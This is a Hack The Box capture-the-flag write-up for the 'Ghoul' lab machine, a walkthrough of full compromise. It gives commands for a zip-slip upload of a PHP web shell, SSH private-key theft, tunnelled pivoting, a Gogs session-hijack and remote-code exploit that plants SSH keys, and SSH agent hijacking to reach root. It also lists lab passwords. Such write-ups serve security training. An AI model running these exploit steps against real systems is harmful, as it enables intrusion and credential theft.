---
layout: single
title: Ghoul - Hack The Box
published: false
excerpt: "This box is brutal, just brutal… it starts out being fun, but I will tell you now 
that it’s not for the faint of heart. I anticipate that this writeup will be my longest one yet."
date: 2019-10-05
classes: wide
header:
  teaser: /assets/images/htb-writeup-ghoul/ghoul.jpeg
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - basic auth
  - zip
  - p0wny
  - gogs
  - session hijacking
---

![](/assets/images/htb-writeup-ghoul/ghoul.jpeg)

This box is brutal, just brutal… it starts out being fun, but I will tell you now 
that it’s not for the faint of heart. I anticipate that this writeup will be my longest one yet.

## TLDR

- First we log in to the web service running on port 8080 with `admin:admin` credentials
- Then upload malicious zip file to trick zip extractor to put a php shell in the web root
- Use php shell to download private keys from a backup folder
- ssh to box as kaneki
- use ssh pivoting to access other subnets and boxes
- upload statically compiled binaries to assist with enumeration
- Exploit Gogs server with Gogsownz
- Peruse git commit history for password for archive file
- Hijack root session

## Scans Away

As always, we start out with the basics! Let's run a quick TCP scan and save the results to the 
nmap folder for later reference.

```commandline
# Nmap 7.70SVN scan initiated Mon May  6 11:02:16 2019 as: nmap -sC -sV -oA nmap/quickscan 10.10.10.101
Nmap scan report for 10.10.10.101
Host is up (0.14s latency).
Not shown: 996 closed ports
PORT 	STATE SERVICE VERSION
22/tcp   open  ssh 	OpenSSH 7.6p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c1:1c:4b:0c:c6:de:ae:99:49:15:9e:f9:bc:80:d2:3f (RSA)
|_  256 a8:21:59:7d:4c:e7:97:ad:78:51:da:e5:f0:f9:ab:7d (ECDSA)
80/tcp   open  http	Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Aogiri Tree
2222/tcp open  ssh 	OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 63:59:8b:4f:8d:0a:e1:15:44:14:57:27:e7:af:fb:3b (RSA)
|   256 8c:8b:a0:a8:85:10:3d:27:07:51:29:ad:9b:ec:57:e3 (ECDSA)
|_  256 9a:f5:31:4b:80:11:89:26:59:61:95:ff:5c:68:bc:a7 (ED25519)
8080/tcp open  http	Apache Tomcat/Coyote JSP engine 1.1
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Aogiri
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88 - Error report
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can see that SSH is running on 2 ports (22 & 2222). This is interesting, but let's come back to that in a bit.

## Port 8080 - Web enumeration

This web service is protected by basic auth. The protection is not so great as you can get in with `admin:admin` credentials.

### Evil Zipper

This page is confusing as it has multiple divs, but keep watching the rotating upload div and you'll see
an option to upload a `.zip` file. It appears that the code will take the zip file and extract it to
an unknown location.

Because this is blind, we need to create several zip files with different depths until we find one that will allow us 
to extract a payload into the /var/www/html path. I decided to go with `p0wny.php` shell, but any simple php
shell would do the trick.

To do this, I used a project called EvilArc

https://github.com/ptoomey3/evilarc

```commandline
python exploit.py p0wny.php --os unix --path var/www/html/ --depth 3 --output evil3.zip

python exploit.py p0wny.php --os unix --path var/www/html/ --depth 4 --output evil4.zip

python exploit.py p0wny.php --os unix --path var/www/html/ --depth 5 --output evil5.zip
```

The appropriate depth in this case is 3. When this is uploaded, `p0wny.php` is extracted and placed into the html 
folder. We now have our foothold!

### Web Shell

You can use p0wnyshell or several other php based shells to start browsing around the filesystem. Get used to it as you’ll be doing a lot of this!

Looking in the `/etc/passwd` and `/home` directories you’ll find 3 users
* eto
* kaneki 
* noro

Eventually you will find an interesting folder here: `/var/backups/backups/`

```commandline
cd /var/backups/backups
kaneki@Aogiri:/var/backups/backups$ ls
Important.pdf  keys  note.txt  sales.xlsx
kaneki@Aogiri:/var/backups/backups$ cat note.txt
The files from our remote server Ethereal will be saved here. I'll keep updating it overtime, so keep checking.
kaneki@Aogiri:/var/backups/backups$ ls keys
eto.backup  kaneki.backup  noro.backup
```

Well looky here! And now we have 3 private keys :)

Let’s copy these bad boys to your local box. I named them kaneki.key, noro.key and eto.key. Don’t forget to chmod 600 each of them before use. Noro 

From Kali:
```commandline
root@kali:~/htb/machines/ghoul# ssh noro@10.10.10.101 -i noro.key
noro@Aogiri:~$ ls -al
total 40
drwx------ 1 noro noro 4096 Dec 13 13:45 .
drwxr-xr-x 1 root root 4096 Dec 13 13:45 ..
lrwxrwxrwx 1 root root	9 Dec 29 05:18 .bash_history -> /dev/null
-rwx------ 1 noro noro  220 Dec 13 13:45 .bash_logout
-rwx------ 1 noro noro 3771 Dec 13 13:45 .bashrc
-rwx------ 1 noro noro  807 Dec 13 13:45 .profile
drwx------ 1 noro noro 4096 Dec 13 13:45 .ssh
-rwx------ 1 noro noro   24 Dec 13 13:45 to-do.txt
noro@Aogiri:~$ cat to-do.txt
Need to update backups.
```

Let’s skip that for now and look for another user with more privs. Logging in as kaneki requires a passphrase! 
Hopefully you downloaded or had a look at `secret.php` while you were browsing `/var/www/html` because you will need it.  

Kaneki's password is: `ILoveTouka` (You should comit this to memory as you'll be typing it a lot!!)

```commandline
root@kali:~/htb/machines/ghoul# ssh kaneki@10.10.10.101 -i kaneki.key
Enter passphrase for key 'kaneki.key':
Last login: Sat May 11 14:12:03 2019 from 10.10.14.21
kaneki@Aogiri:~$ kaneki@Aogiri:~$ ls -al
total 92
drwx------ 1 kaneki kaneki  4096 Dec 13 13:45 .
drwxr-xr-x 1 root   root	4096 Dec 13 13:45 ..
lrwxrwxrwx 1 root   root   	9 Dec 29 05:18 .bash_history -> /dev/null
-rwx------ 1 kaneki kaneki   220 Dec 13 13:45 .bash_logout
-rwx------ 1 kaneki kaneki  3771 Dec 13 13:45 .bashrc
-rwx------ 1 kaneki kaneki   807 Dec 13 13:45 .profile
drwx------ 1 kaneki kaneki  4096 Dec 13 13:45 .ssh
-rw------- 1 kaneki kaneki  1802 Dec 13 13:45 .viminfo
-rw------- 1 kaneki kaneki   148 Dec 13 13:45 note.txt
-rwx------ 1 kaneki kaneki   136 Dec 13 13:45 notes
-rwx------ 1 kaneki kaneki 39382 Dec 13 13:45 secret.jpg
-rwx------ 1 kaneki kaneki	33 Dec 13 13:45 user.txt
kaneki@Aogiri:~$ cat user.txt
7c0f11041f210f4f7d1711d40a1c35c2
```

## The Epic Journey to Root!
Easy peasy so far, right? Well let's get ready to enter through the looking glass to find root.txt.

### More Enumeration
```commandline
kaneki@Aogiri:~$ ./notes
./notes: line 1: Ive set up file server into the servers: command not found
./notes: line 2: DM: command not found
kaneki@Aogiri:~$ cat note.txt
Vulnerability in Gogs was detected. I shutdown the registration function on our server, please ensure that no one gets access to the test accounts.
kaneki@Aogiri:~$
```
Here we glean some valuable information. Apparently there are other servers and one of them 
could be Gogs (https://gogs.io/). Let’s tuck this away and start looking for other servers,
```commandline
kaneki@Aogiri:~$ cat /etc/hosts
127.0.0.1   	localhost
::1 	localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.20.0.10 	Aogiri
kaneki@Aogiri:~$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
    	inet 172.20.0.10  netmask 255.255.0.0  broadcast 172.20.255.255
    	ether 02:42:ac:14:00:0a  txqueuelen 0  (Ethernet)
    	RX packets 5006487  bytes 1174016310 (1.1 GB)
    	RX errors 0  dropped 0  overruns 0  frame 0
    	TX packets 4461698  bytes 959534467 (959.5 MB)
    	TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
    	inet 127.0.0.1  netmask 255.0.0.0
    	loop  txqueuelen 1000  (Local Loopback)
    	RX packets 4436  bytes 349880 (349.8 KB)
    	RX errors 0  dropped 0  overruns 0  frame 0
    	TX packets 4436  bytes 349880 (349.8 KB)
    	TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

kaneki@Aogiri:~$
```

Now we know there’s a subnet called `172.20.0.0/24`. I uploaded a statically compiled nmap, but you can bash scan as well

```commandline
kaneki@Aogiri:/tmp$ ls
hsperfdata_root  nmap
kaneki@Aogiri:/tmp$ chmod +x nmap
kaneki@Aogiri:/tmp$ ./nmap -sP 172.20.0.0/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-05-11 14:43 UTC
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for Aogiri (172.20.0.1)
Host is up (0.00027s latency).
Nmap scan report for Aogiri (172.20.0.10)
Host is up (0.000031s latency).
Nmap scan report for 64978af526b2.Aogiri (172.20.0.150)
Host is up (0.00025s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.62 seconds

kaneki@Aogiri:/tmp$ ./nmap 172.20.0.150

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-05-11 14:52 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 64978af526b2.Aogiri (172.20.0.150)
Host is up (0.00016s latency).
Not shown: 1206 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
kaneki@Aogiri:/tmp$
```

We've discovered a new host: 64978af526b2.Aogiri (172.20.0.150) running port 22 only!

Let’s jump over there… but wait… `kaneki@172.20.0.150` doesn’t work… more enumeration!

```commandline
kaneki@Aogiri:~$ cat .ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhK6T0d7TXpXNf2anZ/02E0NRVKuSWVslhHaJjUYtdtBVxCJg+wv1oFG
Pij9hgefdmFIKbvjElSr+rMrQpfCn6v7GmaP2QOjaoGPPX0EUPn9swnReRgi7xSKvHzru/ESc9AVIQIaeTypLNT/FmNuyr
8P+gFLIq6tpS5eUjMHFyd68SW2shb7GWDM73tOAbTUZnBv+z1fAXv7yg2BVl6rkknHSmyV0kQJw5nQUTm4eKq2AIYTMB76
EcHc01FZo9vsebBnD0EW4lejtSI/SRC+YCqqY+L9TZ4cunyYKNOuAJnDXncvQI8zpE+c50k3UGIatnS5f2MyNVn1l1bYDF
QgYl kaneki_pub@kaneki-pc
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsiPbWC8feNW7o6emQUk12tFOcucqoS/nnKN/LM3hCtPN8r4by8Ml1IR
5DctjeurAmlJtXcn8MqlHCRbR6hZKydDwDzH3mb6M/gCYm4fD9FppbOdG4xMVGODbTTPV/h2Lh3ITRm+xNHYDmWG84rQe+
+gJImKoREkzsUNqSvQv4rO1RlO6W3rnz1ySPAjZF5sloJ8Rmnk+MK4skfj00Gb2mM0/RNmLC/rhwoUC+Wh0KPkuErg4Ylq
D8IB7L3N/UaaPjSPrs2EDeTGTTFI9GdcT6LIaS65CkcexWlboQu3DDOM5lfHghHHbGOWX+bh8VHU9JjvfC8hDN74IvBsy1
20N5 kaneki@Aogiri
```


So let’s connect! Don’t forget `ILoveTouka`
```commandline
kaneki@Aogiri:~$ ssh kaneki_pub@172.20.0.150
Enter passphrase for key '/home/kaneki/.ssh/id_rsa':
Last login: Sun Jan 20 12:43:37 2019 from 172.20.0.10
kaneki_pub@kaneki-pc:~$ cat to-do.txt
Give AogiriTest user access to Eto for git.

kaneki_pub@kaneki-pc:~$ cat /etc/passwd
<snip>
kaneki_adm:x:1001:1001::/home/kaneki_adm:/bin/bash
kaneki_pub:x:1000:1002::/home/kaneki_pub:/bin/bash
```
From the `to-do.txt` we find that we need to give AogiriTest user access to Eto for git… 
let’s remember that, let’s also remember that there’s a kaneki_adm user (and of course root).



### Another host, another subnet - 172.18.0.0/24

Running ifconfig, we see that this box has two ip’s on two subnets. Let’s upload nmap here and scan the 172.18.0.0/24 domain

```commandline
kaneki_pub@kaneki-pc:~$ ifconfig

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
    	inet 172.20.0.150  netmask 255.255.0.0  broadcast 172.20.255.255
    	ether 02:42:ac:14:00:96  txqueuelen 0  (Ethernet)
    	RX packets 9875  bytes 1696240 (1.6 MB)
    	RX errors 0  dropped 0  overruns 0  frame 0
    	TX packets 8628  bytes 1531313 (1.5 MB)
    	TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
    	inet 172.18.0.200  netmask 255.255.0.0  broadcast 172.18.255.255
    	ether 02:42:ac:12:00:c8  txqueuelen 0  (Ethernet)
    	RX packets 5670  bytes 1109362 (1.1 MB)
    	RX errors 0  dropped 0  overruns 0  frame 0
    	TX packets 6001  bytes 1249374 (1.2 MB)
    	TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
    	inet 127.0.0.1  netmask 255.0.0.0
    	loop  txqueuelen 1000  (Local Loopback)
    	RX packets 0  bytes 0 (0.0 B)
    	RX errors 0  dropped 0  overruns 0  frame 0
    	TX packets 0  bytes 0 (0.0 B)
    	TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
More host Discovery!

```commandline
kaneki@Aogiri:~$ cd /tmp
kaneki@Aogiri:/tmp$ scp nmap kaneki_pub@172.20.0.150:/tmp/nmap
Enter passphrase for key '/home/kaneki/.ssh/id_rsa':
nmap                                                             	100% 5805KB 156.5MB/s   00:00    
kaneki@Aogiri:/tmp$
kaneki@Aogiri:/tmp$ ssh kaneki_pub@172.20.0.150
Enter passphrase for key '/home/kaneki/.ssh/id_rsa':
Last login: Sat May 11 15:37:37 2019 from 172.20.0.10
kaneki_pub@kaneki-pc:~$ cd /tmp
kaneki_pub@kaneki-pc:/tmp$ ./nmap -sP 172.18.0.0/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-05-11 15:45 GMT
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for Aogiri (172.18.0.1)
Host is up (0.00039s latency).
Nmap scan report for cuff_web_1.cuff_default (172.18.0.2)
Host is up (0.00026s latency).
Nmap scan report for kaneki-pc (172.18.0.200)
Host is up (0.000060s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.43 seconds
```

#### Information Review
So let’s take a minute and figure out what we’ve learned!

There are 3 hosts on the 172.18.0.0/24 CIDR
* Aogiri is same as 10.10.10.101 (172.18.0.1)
* Cuff_web_1.cuff_default (172.18.0.2)
* Kaneki-pc (172.18.0.200 and 172.20.0.150)

#### Recon of 172.18.0.2

```commandline
kaneki_pub@kaneki-pc:/tmp$ ./nmap 172.18.0.2 -p-

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-05-11 21:06 GMT
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for cuff_web_1.cuff_default (172.18.0.2)
Host is up (0.00012s latency).
Not shown: 65533 closed ports
PORT 	STATE SERVICE
22/tcp   open  ssh
3000/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1.80 seconds
```

It’s not possible to connect to 22 without any more information. Time to do some port forwarding so we can recon port 3000!. It’s possible to do this a few ways, but let’s do this!

### Pivoting!!

127.0.0.1 3000 > 10.10.10.101 > 172.20.0.150

Open a new pane in tmux and run the following on Kali:
```commandline
root@kali:~/htb/machines/ghoul# ssh -L 127.0.0.1:3000:172.20.0.150:3000 kaneki@10.10.10.101 -i kaneki.key
Enter passphrase for key 'kaneki.key':
Last login: Sat May 11 21:04:48 2019 from 10.10.14.21
kaneki@Aogiri:~$
```

We should still be connected to 172.20.0.150 on initial pane:
```commandline
root@kali:~/htb/machines/ghoul# ssh -L 172.20.0.150:3000:172.18.0.2:3000 kaneki_pub@172.18.0.200
Enter passphrase for key 'kaneki.key':
Last login: Sat May 11 21:05:11 2019 from 172.20.0.10
kaneki_pub@kaneki-pc:~$
```

If all is well, go ahead and open a browser to:

http://127.0.0.1:3000

Found our Gogs Server!!!!

### Welcome to Gogs!
Now that we have a Gog ui, we have to figure out how to get in. Brute-forcing will not solve anything. We know from enumeration that AogiriTest is our best candidate for a user account, but what is the password?

#### Enumeration - Part deux!
Eventually, we look back at our initial box (10.10.10.101 for those playing at home). As we may remember, there are two web services, one on port 80 running apache, and one on port 8080 running Tomcat, we have to find the tomcat home directories.

Leaving your tunnel alone for now, open up yet another tmux pane and let’s find tomcat’s home directory in the .101 box

```commandline
kaneki@Aogiri:/$ find / -name "tomcat*" 2>/dev/null
/usr/share/tomcat7
<snip>

kaneki@Aogiri:/usr/share/tomcat7$ grep -r "aogiri"
conf/tomcat-users.xml:  <!--<user username="admin" password="test@aogiri123" roles="admin" />
```

Let’s log in with `AogiriTest:test@aogiri123`

Looking around, there’s not a lot here. Looks like it’s time to search the web for exploits and fun!

**Gogsownz**

https://github.com/TheZ3ro/gogsownz

After much experimentation, found that you can privesc to an admin user (kaneki) by running the follwoing:

Step 1: log in as AogiriTest and grab the special i_like_gogits cookie. 

Step 2: Run this command to get the session cookie for kaneki

```commandline
root@kali:~/htb/machines/ghoul/gogsownz# python3 gogsownz.py -k -n i_like_gogits -C AogiriTest:test@aogiri123 -c fa348246aeb2b560 http://127.0.0.1:3000 -v
[i] Starting Gogsownz on: http://127.0.0.1:3000
[+] Loading Gogs homepage
[i] Gogs Version installed: © 2018 Gogs Version: 0.11.66.0916
[i] The Server is redirecting on the login page. Probably REQUIRE_SIGNIN_VIEW is enabled so you will need an account.
[+] Performing login
[+] Logged in sucessfully as AogiriTest
[+] Got UserID 2
[+] Repository created sucessfully
[i] Exploiting authenticated PrivEsc...
[+] Uploading admin session as repository file
[+] Uploaded successfully.
[+] Committing the Admin session
[+] Committed sucessfully
[i] Signed in as kaneki, is admin True
[i] Current session cookie: '2e16001337'
[i] Done!
root@kali:~/htb/machines/ghoul/gogsownz#
```
Step 3: Get Burp up and running and make sure the proxy is set to Intercept On

Step 4: Copy the new session cookie into the following command, being ready to intercept in Burp and remove the _csrf cookie from each request. This command will add the public key for kaneki into the gogs user’s authorized_keys (we still don’t know who is the user):

```commandline
root@kali:~/htb/machines/ghoul/gogsownz# python3 gogsownz.py http://127.0.0.1:3000/ -v -n 'i_like_gogits' -c '2e16001337' --rce 'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsiPbWC8feNW7o6emQUk12tFOcucqoS/nnKN/LM3hCtPN8r4by8Ml1IR5DctjeurAmlJtXcn8MqlHCRbR6hZKydDwDzH3mb6M/gCYm4fD9FppbOdG4xMVGODbTTPV/h2Lh3ITRm+xNHYDmWG84rQe++gJImKoREkzsUNqSvQv4rO1RlO6W3rnz1ySPAjZF5sloJ8Rmnk+MK4skfj00Gb2mM0/RNmLC/rhwoUC+Wh0KPkuErg4YlqD8IB7L3N/UaaPjSPrs2EDeTGTTFI9GdcT6LIaS65CkcexWlboQu3DDOM5lfHghHHbGOWX+bh8VHU9JjvfC8hDN74IvBsy120N5 kaneki@kaneki-pc" > ~/.ssh/authorized_keys' --cleanup --burp
```

**BE PATIENT, THIS WILL WORK BUT YOU MIGHT HAVE TO TRY A FEW TIMES **

#### 172.18.0.2 - Gogs server enumeration

Root.txt is not here either… son of a gun! Have fun browsing around!

```commandline
kaneki_pub@kaneki-pc:~$ ssh git@172.18.0.2
Enter passphrase for key '/home/kaneki_pub/.ssh/id_rsa':
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <http://wiki.alpinelinux.org>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

3713ea5e4353:~$ ls -al
total 20
drwxr-xr-x	4 git  	git       	4096 May 10 13:38 .
drwxr-xr-x	5 git  	git       	4096 Dec 13 13:16 ..
lrwxrwxrwx	1 git  	git          	9 Dec 29 06:42 .bash_history -> /dev/null
-rw-r--r--	1 git  	git         	71 May 10 13:38 .gitconfig
drwx------	2 git  	git       	4096 May 11 22:24 .ssh
drwxr-xr-x	4 git  	git       	4096 Dec 13 13:24 gogs-repositories
```
Eventually, we discover a strange process called gosu:
```commandline
3713ea5e4353:~$ gosu
Usage: gosu user-spec command [args]
   ie: gosu tianon bash
   	gosu nobody:root bash -c 'whoami && id'
   	gosu 1000:1 id

3713ea5e4353:~$ gosu root:root bash -c 'ls -la /root'
total 128
drwx------	1 root 	root      	4096 Dec 29 07:07 .
drwxr-xr-x	1 root 	root      	4096 Dec 13 13:16 ..
lrwxrwxrwx	1 root 	root         	9 Dec 29 06:41 .ash_history -> /dev/null
lrwxrwxrwx	1 root 	root         	9 Dec 29 06:41 .bash_history -> /dev/null
-rw-r--r--	1 root 	root    	117507 Dec 29 06:40 aogiri-app.7z
-rwxr-xr-x	1 root 	root       	179 Dec 16 07:10 session.sh
```

Get that aogiri-app.7z file back to Kali via a bunch of scp commands

## C'mon Git Happy!
* Step 1: Extract the .7z file
* Step 2: browse to the folder
* Step 3: use git reflog to get a full history of the repo
* Step 4: use git diff to compare each branch o the other

Eventually you’ll find a few passwords in the application.properties file:
`7^Grc%C\7xEQ?tb4`

Where to use it? Password all the things!!!!

Turns out `kaneki-pc` is a great spot to use it.

```commandline
kaneki_pub@kaneki-pc:~$ su root
Password:
root@kaneki-pc:/home/kaneki_pub#
```

## Session Hijacking

If you upload pspy64 to the box and run it, you’ll see that kaneki_adm logs in every 6 minutes. You must react quickly to catch the session and hijack it!

https://xorl.wordpress.com/2018/02/04/ssh-hijacking-for-lateral-movement/

* Step 1: upload pspy64 to kaneki-pc 
* Step 2: get two root connections on 172.18.0.200
* Step 3: as soon as you see this come up in pspy64

```commandline
<snip>
2019/05/10 13:12:01 CMD: UID=1001 PID=1675   | sshd: kaneki_adm     
2019/05/10 13:12:01 CMD: UID=1001 PID=1676   | sshd: kaneki_adm@pts/5
<snip>
```
… run this in your other pane. Your agent and ssh- values will be different than mine each time!

```commandline
root@kaneki-pc:/home/kaneki_adm# find /tmp -name *agent* 
root@kaneki-pc:/home/kaneki_adm# find /tmp -name "*agent*" 2>/dev/null
/tmp/ssh-v2z2opBufh/agent.1675
root@kaneki-pc:/home/kaneki_adm# SSH_AUTH_SOCK=/tmp/ssh-v2z2opBufh/agent.1675 ssh root@172.18.0.1 -p 2222
```

If this works, you’ll have the following:

```commandline
root@Aogiri:/# cat /root/root.txt
7c0f11041f210f4fadff7c077539e72f
```

And your done!!! Happy hacking!

